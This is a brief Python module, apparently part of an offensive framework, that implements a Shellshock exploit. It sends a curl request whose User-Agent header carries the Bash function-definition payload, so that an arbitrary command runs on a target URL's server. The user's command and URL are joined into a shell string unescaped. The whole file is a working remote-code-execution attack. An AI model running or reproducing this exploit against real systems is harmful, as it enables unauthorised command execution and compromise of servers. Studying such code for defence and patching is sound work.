from subprocess import run as execute
from modules.exploits.internal.base import Exploit
from sys import exit

class ShellShock(Exploit):
  def __init__(self):
    super().__init__()

    self.prompt = "[ShellShock] > "
    self.args = {
      "url" : "vulnerable target URL",
      "cmd" : "command to run on vulnerable target"
    }
    self.url = "N/a"
    self.cmd = "N/a"
	
  def run(self):
    exploit = 'curl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
    exploit += '\'' + self.cmd + '\'"'
    exploit += ' ' + self.url

    execute(exploit, shell=True)
